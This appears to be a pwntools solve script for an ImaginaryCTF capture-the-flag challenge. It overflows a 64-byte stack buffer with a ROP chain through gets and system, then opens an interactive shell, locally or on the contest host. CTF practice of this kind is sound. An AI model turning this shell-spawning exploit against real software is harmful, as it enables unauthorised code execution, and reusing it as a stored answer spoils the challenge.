#!/usr/bin/python3

from pwn import *

exe = ELF('vuln', checksec=False)

context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b*main+35

                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('ret2win.chal.imaginaryctf.org', 1337)
else:
        p = process(exe.path)

GDB()
payload = b"a" * 64 + p64(0x0000000000404a00) + p64(exe.plt['gets']) + p64(exe.sym['system'])
sl(payload)
payload = b"/bin" + b"0sh\0"
sl(payload)
p.interactive()
